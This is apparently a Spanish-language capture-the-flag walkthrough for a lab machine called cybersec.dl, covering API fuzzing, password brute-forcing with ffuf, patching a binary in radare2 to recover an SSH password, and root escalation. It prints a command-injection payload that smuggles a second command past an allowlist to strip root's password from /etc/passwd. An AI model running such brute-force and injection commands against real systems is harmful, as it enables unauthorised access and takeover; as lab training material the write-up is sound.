## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En el escaneo encuentro un dominio:

```bash
http://cybersec.dl
```

Dentro no hay mucho y el subdominio tampoco interesa pero interceptando la petición con BurpSuite encuentro una api:

```bash
http://cybersec.dl/api/1passwsecu0
```

Genera contraseñas aleatorias cada vez que recargo la página. Decido hacerle fuzzing a la api:

```bash
feroxbuster -u "http://cybersec.dl/api/" -w directory-list-2.3-medium.txt -n --no-state -t 200
```

Encuentro un endpoint llamado /login.

La llamo desde la terminal a ver si funciona:

```bash
curl -X POST http://cybersec.dl/api/login
```

Funciona pero espera un “Content-Type” en json:

```bash
curl -X POST 'http://cybersec.dl/api/login' --header "Content-Type: application/json" --data '{"username":"admin", "password":"admin"}'
```

Compruebo que funciona por la respuesta:

```bash
{
  "message": "Invalid credentials"
}
```

Entonces le aplico fuerza bruta para conseguir la contraseña:

```bash
ffuf -u http://cybersec.dl/api/login -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "FUZZ"}' -w /usr/share/wordlists/rockyou.txt -fs 39
```

Encuentro “undertaker”

```bash
curl -X POST http://cybersec.dl/api/login \ 
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "undertaker"}'
```

Info:

```bash
{
  "company": {
    "URLs_web": "cybersec.dl, bin.cybersec.dl, mail.cybersec.dl, dev.cybersec.dl, cybersec.dl/downloads, internal-api.cybersec.dl, 0internal_down.cybersec.dl, internal.cybersec.dl, cybersec.dl/documents, cybersec.dl/api/cpu, cybersec.dl/api/login",
    "address": "New York, EEUU",
    "branches": "Brazil, Curacao, Lithuania, Luxembourg, Japan, Finland",
    "customers": "ADIDAS, COCACOLA, PEPSICO, Teltonika, Toray Industries, Weg, CURALINk",
    "name": "CyberSec Corp",
    "phone": "+1322302450134200",
    "services": "Auditorias de seguridad, Pentesting, Consultoria en ciberseguridad"
  },
  "message": "Login successful"
}
```

Revela varios subdominios. Probando varias sirve “0internal_down.cybersec.dl"

```bash
http://0internal_down.cybersec.dl
```

Donde hay un binario para descargar con una nota que pone que la contraseña del usuario flypsi esta en el binario llamado smashing.

Lo ejecuto para ver que hace y de paso compruebo un desbordamiento de buffer:

```bash
./smashing
```

Info:

```bash
Bienvenido al programa interactivo.
Introduce tu nombre: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hola, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
*** stack smashing detected ***: terminated
zsh: IOT instruction  ./smashing
```

Utilizo Ghidra para ver las funciones y analizarlo.

Toca hacer una modificación de bytes para llamar a la función factor1.

Utilizaré la herramienta Radare2 ya que es complejo para realizarlo con Ghidra:

```bash
radare2 -A -w smashing
```

Identifico donde esta la dirección de memoria que llama a la función factor2:

```bash
pdf @ main
```

Interesa:

```bash
0x000023dc      e8fafeffff     call sym.factor2
```

Toca modificar sym.factor2 por sym,factor1, pero antes concoer la dirección de memoria de factor1:

```bash
pdf @ sym.factor1
```

Interesa:

```bash
CODE XREF from sym.factor1 @ 0x22d2(x)
```

Por lo que vemos corresponde sym.factor1 con 0x22d2, teniendo todo esto, ya podremos realizar el calculo de los bytes que tendremos que poner en la dirección que comente antes para poder llamar a sym.factor1.

**Calcular el desplazamiento relativo**

La instrucción `call` usa una dirección **relativa** y se calcula así:

[](https://dise0.gitbook.io/h4cker_b00k/~gitbook/image?url=https%3A%2F%2F4289632959-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F5Wk1VNaLaqCTbfMb7tfp%252Fuploads%252FGbyLp4U79nQibk0ThnHu%252Fimage.png%3Falt%3Dmedia%26token%3D9ab6189e-47b3-4a7d-8524-491767ce8bd9&width=768&dpr=3&quality=100&sign=b914cf0f&sv=2)

Sabemos que:

- `factor1` = **0x000020a7**
- `call` en `0x000023dc`

[](https://dise0.gitbook.io/h4cker_b00k/~gitbook/image?url=https%3A%2F%2F4289632959-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F5Wk1VNaLaqCTbfMb7tfp%252Fuploads%252FL8s1OdiNcpbDvP96cthQ%252Fimage.png%3Falt%3Dmedia%26token%3D6372c8bb-b089-4d7b-93a5-d2e6e78c8f24&width=768&dpr=3&quality=100&sign=38d656fe&sv=2)

Convertimos `-0x33A` a **little-endian** en 4 bytes:

[](https://dise0.gitbook.io/h4cker_b00k/~gitbook/image?url=https%3A%2F%2F4289632959-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F5Wk1VNaLaqCTbfMb7tfp%252Fuploads%252FqO77PoAAvJtemU2YzcGt%252Fimage.png%3Falt%3Dmedia%26token%3Deb8f3a54-1264-4344-a239-495684241734&width=768&dpr=3&quality=100&sign=386cf4e2&sv=2)

Si también contamos con el `opcode` del `CALL` que es `e8` nos quedaría algo así:

```bash
e8 c6 fc ff ff
```

Ahora lo sobrescribo:

```bash
s 0x000023dc #Cambiar a la direccion de memoria
wx e8 c6 fc ff ff @ 0x000023dc #Sobreescribir la direccion con sym.factor1
wq #Para guardar los cambios
pd 5 #Visualizar los cambios
```

Y al ejecutar el binario nos da:

```bash
2tP42bSzBTnmEAuAGkxj3
```

Que es un string codificado en base58, decodificado es:

```bash
Chocolate.1704
```

Contraseña para el usuario flypsi de SSH.

## Escalada

Listo los grupos:

```bash
getent group
```

Encuentro el grupo cyber, así que hago una búsqueda por grupos con find:

```bash
find / -group cyber 2>/dev/null
# Info:
/var/www/html/serverpi.py
```

Leyendo el script es un código en Python codificado en base64, así que lo decodifico en mi maquina host:

```bash
echo 'aW1wb3J0IGh0dHAuc2VydmVyCmltcG9ydCBzb2NrZXRzZXJ2ZXIKaW1wb3J0IHVybGxpYi5wYXJzZQppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgYmFzZTY0CgpQT1JUID0gMjUwMDAKCkFVVEhfS0VZX0JBU0U2NCA9ICJNREF3TUdONVltVnljMlZqWDJkeWIzVndYM0owWHpBd01EQXdNQW89IgoKY2xhc3MgSGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgogICAgZGVmIGRvX0dFVChzZWxmKToKICAgICAgICBhdXRoX2hlYWRlciA9IHNlbGYuaGVhZGVycy5nZXQoJ0F1dGhvcml6YXRpb24nKQoKICAgICAgICBpZiBhdXRoX2hlYWRlciBpcyBOb25lIG9yIG5vdCBhdXRoX2hlYWRlci5zdGFydHN3aXRoKCdCYXNpYycpOgogICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoNDAxKQogICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCJDb250ZW50LXR5cGUiLCAidGV4dC9wbGFpbiIpCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKGIiQXV0aG9yaXphdGlvbiBoZWFkZXIgaXMgbWlzc2luZyBvciBpbmNvcnJlY3QiKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgIyBFeHRyYWVyIGxhIGNsYXZlIGVudmlhZGEgcG9yIGVsIGNsaWVudGUgKGVuIEJhc2U2NCkKICAgICAgICBlbmNvZGVkX2tleSA9IGF1dGhfaGVhZGVyLnNwbGl0KCdCYXNpYyAnKVsxXQoKICAgICAgICAjIERlY29kaWZpY2FyIGxhIGNsYXZlIGFsbWFjZW5hZGEgZW4gQmFzZTY0CiAgICAgICAgZGVjb2RlZF9zdG9yZWRfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShBVVRIX0tFWV9CQVNFNjQpLmRlY29kZSgpLnN0cmlwKCkgICMgRWxpbWluYXIgc2FsdG9zIGRlIGzDrW5lYQoKICAgICAgICAjIERlY29kaWZpY2FyIGxhIGNsYXZlIGVudmlhZGEgcG9yIGVsIGNsaWVudGUKICAgICAgICBkZWNvZGVkX2NsaWVudF9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGVuY29kZWRfa2V5KS5kZWNvZGUoKS5zdHJpcCgpICAjIEVsaW1pbmFyIHNhbHRvcyBkZSBsw61uZWEKCiAgICAgICAgIyBDb21wYXJhciBsYXMgY2xhdmVzCiAgICAgICAgaWYgZGVjb2RlZF9jbGllbnRfa2V5ICE9IGRlY29kZWRfc3RvcmVkX2tleToKICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDQwMykKICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcigiQ29udGVudC10eXBlIiwgInRleHQvcGxhaW4iKQogICAgICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShiIkludmFsaWQgYXV0aG9yaXphdGlvbiBrZXkiKQogICAgICAgICAgICByZXR1cm4KCiAgICAgICAgIyBQcm9jZXNhciBlbCBwYXLDoW1ldHJvICdleGVjJwogICAgICAgIHBhcnNlZF9wYXRoID0gdXJsbGliLnBhcnNlLnVybHBhcnNlKHNlbGYucGF0aCkKICAgICAgICBxdWVyeV9wYXJhbXMgPSB1cmxsaWIucGFyc2UucGFyc2VfcXMocGFyc2VkX3BhdGgucXVlcnkpCgogICAgICAgIGlmICdleGVjJyBpbiBxdWVyeV9wYXJhbXM6CiAgICAgICAgICAgIGNvbW1hbmQgPSBxdWVyeV9wYXJhbXNbJ2V4ZWMnXVswXQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBhbGxvd2VkX2NvbW1hbmRzID0gWydscycsICd3aG9hbWknXQogICAgICAgICAgICAgICAgaWYgbm90IGFueShjb21tYW5kLnN0YXJ0c3dpdGgoY21kKSBmb3IgY21kIGluIGFsbG93ZWRfY29tbWFuZHMpOgogICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZSg0MDMpCiAgICAgICAgICAgICAgICAgICAgc2VsZi5zZW5kX2hlYWRlcigiQ29udGVudC10eXBlIiwgInRleHQvcGxhaW4iKQogICAgICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgICAgIHNlbGYud2ZpbGUud3JpdGUoYiJDb21tYW5kIG5vdCBhbGxvd2VkLiIpCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCgogICAgICAgICAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoY29tbWFuZCwgc2hlbGw9VHJ1ZSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJ0ZXh0L3BsYWluIikKICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShyZXN1bHQpCiAgICAgICAgICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciBhcyBlOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDUwMCkKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJ0ZXh0L3BsYWluIikKICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShlLm91dHB1dCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoNDAwKQogICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCJDb250ZW50LXR5cGUiLCAidGV4dC9wbGFpbiIpCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKGIiTWlzc2luZyAnZXhlYycgcGFyYW1ldGVyIGluIFVSTCIpCgp3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIxMjcuMC4wLjEiLCBQT1JUKSwgSGFuZGxlcikgYXMgaHR0cGQ6CiAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkK' | base64 -d > codigo.py
```

Revisando el script resultante, y veremos que es otro código en Python, pero de un servidor que corre de manera local por el puerto 25000, y nos permite ejecutar "ls" y "whoami" pero solo si nos autenticamos con la clave que nos dan mas arriba. Sabiendo esto, y viendo que la máquina tiene curl instalado, hacemos una petición con la autenticación que nos pide y vemos que somos root:

```bash
curl 'http://127.0.0.1:25000/?exec=whoami;id' -H "Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo="
# Info:
root
uid=0(root) gid=0(root) groups=0(root)
```

Con el siguiente comando seremos root:

```bash
curl 'http://127.0.0.1:25000/?exec=whoami;sed%20s/root:x:/root::/g%20-i%20/etc/passwd' -H "Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo=" && su
```

Listo.
